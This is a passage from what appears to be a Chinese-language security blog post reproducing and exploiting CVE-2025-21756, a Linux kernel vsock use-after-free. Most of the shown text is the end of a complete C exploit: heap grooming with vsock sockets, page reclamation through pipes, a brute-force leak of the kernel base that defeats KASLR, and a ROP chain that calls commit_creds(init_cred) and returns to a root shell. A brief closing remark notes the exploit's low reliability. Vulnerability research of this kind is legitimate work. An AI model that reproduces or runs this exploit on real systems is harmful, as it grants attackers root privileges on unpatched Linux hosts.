buffer[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create Netlink socket</span></span><br><span class="line">    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);</span><br><span class="line">    <span class="keyword">if</span> (sock &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"socket"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.nl_family = AF_NETLINK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare Netlink message</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.sdiag_family = AF_VSOCK;</span><br><span class="line">    req.vdiag_states = (<span class="number">1</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    nlh = (<span class="keyword">struct</span> nlmsghdr *)buffer;</span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(req));</span><br><span class="line">    nlh-&gt;nlmsg_type = SOCK_DIAG_BY_FAMILY;</span><br><span class="line">    nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;</span><br><span class="line">    nlh-&gt;nlmsg_seq = <span class="number">1</span>;</span><br><span class="line">    nlh-&gt;nlmsg_pid = getpid();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(NLMSG_DATA(nlh), &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send request</span></span><br><span class="line">    <span class="comment">//printf("sock: %d\n", sock);</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sock, nlh, nlh-&gt;nlmsg_len, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"ERROR: sendto"</span>);</span><br><span class="line">        close(sock);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Receive response</span></span><br><span class="line">    <span class="type">ssize_t</span> len = recv(sock, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"ERROR: recv"</span>);</span><br><span class="line">        close(sock);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!query_flag++) {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[+]-------------------------------------------[+]"</span>);</span><br><span class="line">        print_binary(buffer, len);</span><br><span class="line">        parse_diag_response(buffer, len);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[+]-------------------------------------------[+]"</span>);</span><br><span class="line">    }</span><br><span class="line">    close(sock);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pin_cpu</span><span class="params">(<span class="type">int</span> cpu)</span> {</span><br><span class="line">    <span class="type">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu, &amp;<span class="built_in">set</span>);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"sched_setaffinity"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp, rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] successful save status"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> sockets[MAX_PORT_RETRIES];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">addr</span>;</span></span><br><span class="line">	<span class="type">int</span> s, i, alen;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line"><span class="string">"                       _                        \n"</span></span><br><span class="line"><span class="string">"                      | |                       \n"</span></span><br><span class="line"><span class="string">" __   _____  ___   ___| | ___ ____      ___ __  \n"</span></span><br><span class="line"><span class="string">" \\ \\ / / __|/ _ \\ / __| |/ / '_ \\ \\ /\\ / / '_ \\ \n"</span></span><br><span class="line"><span class="string">"  \\ V /\\__ \\ (_) | (__|   &lt;| |_) \\ V  V /| | | |\n"</span></span><br><span class="line"><span class="string">"   \\_/ |___/\\___/ \\___|_|\\_\\ .__/ \\_/\\_/ |_| |_|\n"</span></span><br><span class="line"><span class="string">"                           | |                  \n"</span></span><br><span class="line"><span class="string">"                           |_|                  \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] pinning to cpu0"</span>);</span><br><span class="line">    pin_cpu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] alloc enough sockets and prepare bind table"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> junk[FLUSH];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FLUSH; i++)</span><br><span class="line">        junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);</span><br><span class="line"></span><br><span class="line">	alen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">	<span class="keyword">if</span> (getsockname(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;alen)) {</span><br><span class="line">		perror(<span class="string">"getsockname"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">sa</span> =</span> {</span><br><span class="line">       .svm_family = AF_VSOCK,</span><br><span class="line">       .svm_cid = VMADDR_CID_LOCAL,</span><br><span class="line">       .svm_port = addr.svm_port,</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_PORT_RETRIES; ++i) {</span><br><span class="line">        sa.svm_port = ++addr.svm_port;</span><br><span class="line">	    <span class="keyword">if</span> (bind(junk[i], (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa))) {</span><br><span class="line">	    	perror(<span class="string">"bind"</span>);</span><br><span class="line">	    	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	    }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">	close(s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] pre alloc sockets"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pre[PRE];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE; i++)</span><br><span class="line">	    pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] alloc target"</span>);</span><br><span class="line">	s = socket(AF_VSOCK, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>) {</span><br><span class="line">		perror(<span class="string">"socket"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// testing</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] post-alloc objects"</span>);</span><br><span class="line">    <span class="type">int</span> post[POST];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; POST; i++)</span><br><span class="line">        post[i] = socket(AF_VSOCK, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] trigger uaf"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #1 success\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// connect() #1 failed: transport set, sk in unbound list.</span></span><br><span class="line"></span><br><span class="line">	addr.svm_cid = VMADDR_CID_NONEXISTING;</span><br><span class="line">    addr.svm_port = VMADDR_PORT_ANY;</span><br><span class="line">	<span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #2 success\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// connect() #2 failed: transport unset, sk ref dropped?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for input</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] uaf finished!.."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] fill up the cpu partial list"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt; FLUSH; i += OBJS_PER_SLAB)</span><br><span class="line">        close(junk[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] free all the pre/post alloc-ed objects"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; POST; i++)</span><br><span class="line">        close(post[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE; i++)</span><br><span class="line">        close(pre[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] close the junk bound sockets"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FLUSH; i++)</span><br><span class="line">	    close(junk[i]);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipes[NUM_PIPES][<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span> page[PAGE_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">2</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] reclaim page"</span>);</span><br><span class="line">    pause(); <span class="comment">// debug final epxloit </span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> w = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) { <span class="comment">// <span class="doctag">TODO:</span> i &lt; NUM_PIPES, improve stability</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(&amp;pipes[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) {</span><br><span class="line">            perror(<span class="string">"pipe"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        w = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (w &lt; PAGE_SIZE) {</span><br><span class="line">            <span class="type">ssize_t</span> written = write(pipes[i][<span class="number">1</span>], page, <span class="number">8</span>);</span><br><span class="line">            j = query_vsock_diag();</span><br><span class="line">            w += written;</span><br><span class="line">            <span class="keyword">if</span> (j != <span class="number">48</span>) <span class="keyword">goto</span> out;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"."</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">32</span> == <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] found init_net at i=%d and w=%d\n"</span>, i, w);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//long base = 0xffffffff84bb0000; // probably need to change for aslr</span></span><br><span class="line">    <span class="type">long</span> base = <span class="number">0xffffffff84bb1000</span>; <span class="comment">// probably need to change for aslr</span></span><br><span class="line">    <span class="type">long</span> off = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> addy;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] attempting net overwrite (aslr bypass).\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (off &lt; <span class="number">0xffffffff</span>) {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// release the page of vsk</span></span><br><span class="line">        close(pipes[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipes[i][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(&amp;pipes[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) {</span><br><span class="line">            perror(<span class="string">"pipe"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        addy = base + off;</span><br><span class="line"></span><br><span class="line">        write(pipes[i][<span class="number">1</span>], page, w - <span class="number">8</span>);</span><br><span class="line">        write(pipes[i][<span class="number">1</span>], &amp;addy, <span class="number">8</span>);    <span class="comment">//position of sock_net(sk)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (off % <span class="number">256</span> == <span class="number">0</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"+"</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        j = query_vsock_diag();</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">48</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n[*] LEAK init_net @ 0x%lx\n"</span>, base + off);</span><br><span class="line">            <span class="keyword">goto</span> out2;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        off += <span class="number">128</span>; <span class="comment">// <span class="doctag">TODO:</span> modify for aslr?</span></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">out2:</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> kern_base = base + off - <span class="number">0x3bb1f80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] leaked kernel base @ 0x%lx\n"</span>, kern_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate some rop gadgets</span></span><br><span class="line">    <span class="type">long</span> ret = kern_base + <span class="number">0x15e920</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 0xffffffff8115e91f : pop r15 ; ret</span></span><br><span class="line">    <span class="type">long</span> pop_r15_ret = kern_base + <span class="number">0x15e91f</span>;</span><br><span class="line">    <span class="comment">// 0xffffffff8115e920 : pop rdi ; ret</span></span><br><span class="line">    <span class="type">long</span> pop_rdi_ret = kern_base + <span class="number">0x15e920</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// long raw_proto_abort = kern_base + 0x2efa8c0;</span></span><br><span class="line">    <span class="type">long</span> raw_proto = kern_base + <span class="number">0x2ef2400</span>;     <span class="comment">// actually is raw_prot in kallsyms</span></span><br><span class="line">    <span class="type">long</span> raw_proto_abort = raw_proto + <span class="number">0x1c0</span>;   <span class="comment">// the offset of raw_prot-&gt;diag_destroy(raw_abort)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// long null_ptr = kern_base + 0x2eeaee0;</span></span><br><span class="line">    <span class="type">long</span> null_ptr = raw_proto + <span class="number">0x10</span>;           <span class="comment">// obtained from raw_prot struct</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xffffffff82c2a8ed: push rdi; pop rsp; cmp dword ptr [rax - 0x74bf5df6], 0x66b06741; ret;</span></span><br><span class="line">    <span class="comment">// long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;</span></span><br><span class="line">    <span class="type">long</span> push_rbx_pop_rsp_ret = kern_base + <span class="number">0xcbb984</span>;</span><br><span class="line">    <span class="comment">// replace `push rdi` with `push rbx` which I dont find in my kernel &amp; rdi = rbx</span></span><br><span class="line">    <span class="type">long</span> push_rdi_pop_rsp_ret = kern_base + <span class="number">0x1c2a8ed</span>;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> init_cred = kern_base + <span class="number">0x2c74d80</span>;</span><br><span class="line">    <span class="type">long</span> commit_creds = kern_base + <span class="number">0x1fcca0</span>;</span><br><span class="line">    <span class="comment">// return to user mode</span></span><br><span class="line">    <span class="comment">// long swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;</span></span><br><span class="line">    <span class="type">long</span> swapgs_restore_regs_and_return_to_usermode = kern_base + <span class="number">0x1601170</span> + <span class="number">54</span>; <span class="comment">// 54 means begin with mov rdi,rsp</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// info for returning to usermode</span></span><br><span class="line">    <span class="comment">// long user_cs = 0x33;</span></span><br><span class="line">    <span class="comment">// long user_ss = 0x2b;</span></span><br><span class="line">    <span class="comment">// long user_rflags = 0x202;</span></span><br><span class="line">    <span class="type">long</span> shell = (<span class="type">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint64_t* user_rsp = (uint64_t*)get_user_rsp();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] writing the rop chain\n"</span>);</span><br><span class="line"></span><br><span class="line">    close(pipes[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipes[i][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(&amp;pipes[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] writing payload to vsk\n"</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], page, w - <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x330</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'A'</span>, <span class="number">0x330</span>);</span><br><span class="line">    <span class="type">char</span> not[<span class="number">0x330</span>];</span><br><span class="line">    <span class="built_in">memset</span>(not, <span class="number">0</span>, <span class="number">0x330</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the rop chain!</span></span><br><span class="line">    <span class="type">long</span> deadbuf = <span class="number">0</span>;</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;deadbuf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;pop_r15_ret, <span class="number">8</span>); <span class="comment">// junk</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;raw_proto_abort, <span class="number">8</span>); <span class="comment">// sk_prot (calls sk-&gt;sk_error_report())</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;ret, <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// totoally add 0x18 data so dont need `write(pipes[i][1], buf, 0x18);`</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;pop_rdi_ret, <span class="number">8</span>); <span class="comment">// stack pivot target</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;init_cred, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;ret, <span class="number">8</span>); </span><br><span class="line">    <span class="comment">// write(pipes[i][1], &amp;ret, 8); </span></span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;commit_creds, <span class="number">8</span>); <span class="comment">// commit_creds(init_cred);</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;swapgs_restore_regs_and_return_to_usermode, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// rax</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// rdi</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;shell, <span class="number">8</span>); <span class="comment">// rip</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;user_cs, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;user_rflags, <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;user_rsp, <span class="number">8</span>); <span class="comment">// rsp</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;user_ss, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// write(pipes[i][1], buf, 0x18);</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;not, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;not, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;null_ptr, <span class="number">8</span>); <span class="comment">// sk_lock</span></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;push_rbx_pop_rsp_ret, <span class="number">8</span>); <span class="comment">// stack pivot [sk_error_report()]</span></span><br><span class="line">    <span class="comment">// write(pipes[i][1], &amp;push_rdi_pop_rsp_ret, 8); // stack pivot [sk_error_report()]</span></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    close(s); <span class="comment">// trigger the exploit!</span></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>





<h2 id="Notion"><a href="#Notion" class="headerlink" title="Notion"></a>Notion</h2><p>关于漏洞利用部分有一些需要注意的点</p>
<ul>
<li>POC 成功需要大量的页释放和回收命中操作，使得成功率较低</li>
<li>同时原文中所提出的爆破地址，个人看来也仅局限于不开随机化的情况，因为在开启随机化的同时也意味着爆破的次数增加，这使得导致对页命中的要求更高了，从而提前导致内核崩溃</li>
</ul>

        </div>

        
            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> CVE-2025-21756 漏洞复现及利用</li>
        <li><strong>Author:</strong> henry</li>
        <li><strong>Created at
                :</strong> 2025-06-13 11:46:57</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-06-13 12:00:04
            </li>
        
        <li>
            <strong>Link:</strong> https://henrymartin262.github.io/2025/06/13/CVE-2025-21756/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/linux-kernel/">#linux kernel</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/vscok/">#vscok</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/05/28/Pixel_GPU_Exploit/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Mali GPU CVE-2023-48409 分析利用</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container pjax">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fa-solid fa-comments"></i>&nbsp;Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail']
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">CVE-2025-21756 漏洞复现及利用</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2025-21756"><span class="nav-text">CVE-2025-21756</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vsock"><span class="nav-text">Vsock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch"><span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basics"><span class="nav-text">Basics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Struct-info"><span class="nav-text">Struct info</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Introduction"><span class="nav-text">Introduction</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Func"><span class="nav-text">Func</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vsock-create"><span class="nav-text">vsock_create</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vsock-bind"><span class="nav-text">vsock_bind</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vsk-transport"><span class="nav-text">vsk-&gt;transport</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sock-vsock"><span class="nav-text">sock &amp; vsock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vsock-close-s-call-chain"><span class="nav-text">vsock close(s) call chain</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability"><span class="nav-text">Vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final"><span class="nav-text">Final</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Notion"><span class="nav-text">Notion</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
